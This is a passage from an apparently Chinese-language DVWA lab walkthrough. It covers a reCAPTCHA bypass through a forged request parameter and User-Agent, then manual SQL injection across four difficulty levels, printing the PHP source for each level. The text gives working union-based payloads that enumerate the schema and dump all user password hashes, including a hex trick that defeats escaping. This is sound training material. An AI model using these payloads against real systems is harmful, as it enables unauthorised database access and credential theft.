<p>源码中可以看到，服务器的验证逻辑是当$resp（谷歌返回的验证结果）是true，或者参数g-recaptcha-response为hidd3n_valu3()并且HTTP_USER_AGENT为reCAPTCHA则认为已经通过验证码的检查，反之验证失败。</p>
<p>漏洞利用</p>
<p>搞清楚了验证逻辑，剩下的就是伪造绕过了，由于$resp参数无法进行控制，所以将重心放在参数g-recaptcha-response、HTTP_USER_AGENT上。</p>
<p>抓包</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/55.png" alt></p>
<p>更改参数g-recaptcha-response以及http包头的User-Agent:</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/56.png" alt></p>
<p>密码修改成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/57.png" alt></p>
<h3 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_conf ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ <span class="string">'password_current'</span> ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">        $_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">        $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">            $hide_form = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码增加了Anti-CSRF token机制防御CSRF攻击，同时PDO技术防护sql注入，验证过程终于不再分成两个部分，验证码无法绕过，同时要求用户输入之前的密码，进一步加强身份认证。</p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被暴露，尽管如此，sql注入仍是现在最常见的web漏洞之一。</p>
<p><strong>手工注入思路</strong></p>
<p>自动化的注入神器sqlmap，工具虽然好用，但是还是要掌握一些手工注入的思路。</p>
<p>手工注入（非盲注）的步骤</p>
<ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>猜解sql查询语句中的字段数</li>
<li>确定显示的字符顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
<li>获取表中的字段名</li>
<li>下载数据</li>
</ul>
<h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Low级别的代码对于客户端的参数id没有进行任何的检查和过滤，存在明显的sql注入。</p>
<p>漏洞利用</p>
<p>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法查看源码的基础上进行的。</p>
<p>1.判断是否存在注入点，注入是字符型还是数字型</p>
<p>输入1，查询成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/58.png" alt></p>
<p>输入1‘，查询失败，爆出报错信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>根据报错信息在1’添加注释符号#，即输入1‘#，查询成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/59.png" alt></p>
<p>输入1‘ or 1=1#，查询成功，并返回多个结果，说明存在字符型注入</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/60.png" alt></p>
<p>2.猜解sql查询语句中的字段数</p>
<p>输入1’ order by 1#</p>
<pre><code>1‘ order by 2#    .......</code></pre><p>直到3发现报错</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/61.png" alt></p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/62.png" alt></p>
<p>说明执行的sql查询语句中只有两个字段，即这里的First name、Surname</p>
<p>3.确定显示字段的顺序</p>
<p>输入 -1’ union select 1,2#</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/63.png" alt></p>
<p>说明执行的sql语句为select First name,Surname from 表 where ID=’id’….</p>
<p>4.获取当前数据库</p>
<p>输入 -1’ union select 1,database()#</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/64.png" alt></p>
<p>得到数据库名</p>
<p>5.获取数据库中的表</p>
<p>输入-1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’dvwa’#</p>
<p>获得表名guestbook users</p>
<p>6.从users表中获取字段名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>获得字段名：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</p>
<p>7.下载数据</p>
<p>输入：-1‘ union select group_concat(user_id,first_name,last_name),group_concat(password) from users#</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/65.png" alt></p>
<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数岁特殊符号<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>进行转义，同时前端页面设置了下拉选择表单，希望可以通过这样来控制用户输入。</p>
<p>漏洞利用</p>
<p>虽然前段使用下拉选择菜单，但是依然可以通过抓包修改参数，提交恶意构造的查询参数。</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>抓包更改参数id为1‘ or 1=1#</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/66.png" alt></p>
<p>发现报错信息</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">'\'</span> <span class="keyword">or</span> <span class="attribute">1</span>=1#' at line 1</span><br></pre></td></tr></table></figure>

<p>于是更改为1 or 1=1#后查询成功，说明存在数字型注入，由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。</p>
<p>2.猜解sql查询语句中的字段数</p>
<p>将id改为1 order by 1#        1 order by 2#      1 order by 3#(报错)</p>
<p>说明执行的sql查询语句中只有两个字段，即这里的First name、Surname。</p>
<p>3.确定显示字段的顺序</p>
<p>id=1 union select 1,2#</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/67.png" alt></p>
<p>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
<p>4.获取当前数据库</p>
<p>id=-1 union select 1,database()#</p>
<p>获得数据库名dvwa</p>
<p>5.获取数据库中的表名</p>
<p>id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<p>6.获取users表中的字段名</p>
<p>id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p>
<p>查询失败，因为单引号被转义了，使用十六进制进行查询</p>
<p>id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#</p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<p>7.下载数据</p>
<p>-1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p>
<p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h3 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，与Medium级别代码相比，High级别只是在sql查询语句中添加了LIMIT 1,以此控制输出结果。</p>
<p>漏洞利用</p>
<p>虽然添加了limit 1，但是可以通过#将其注释掉。注入过程和前面的基本一样。</p>
<p>需要提到的是，High级别中的查询提交界面和查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
<h3 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到Impossible级别的代码采用PDO技术，划清了代码与数据的界限，有效防御sql注入，同时只返回查询结果数量为1时，才会成功输出，这样就有效预防了暴露数据库，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h2><p>SQL Injection(Blind),即sql盲注，与一般注入的区别在于，一般的攻击者可以直接在页面上看到注入语句的执行结果吗，而盲注时攻击者通常是无法从显示的页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高，目前网络上现存的sql注入漏洞大多是sql盲注。</p>
<p>手工盲注的主要思路</p>
<p>手工盲注的过程大多是你询问服务器一个问题，服务器回答是或者不是，通过这种机械的询问，最终获得你想要的数据。</p>
<p>盲注分为基于布尔盲注、基于时间的盲注以及基于报错的盲注，接下来主要演示基于布尔的盲注和基于时间的盲注。</p>
<p>手工盲注的步骤</p>
<ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>猜解当前数据库名</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>猜解数据</li>
</ul>
<h3 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span 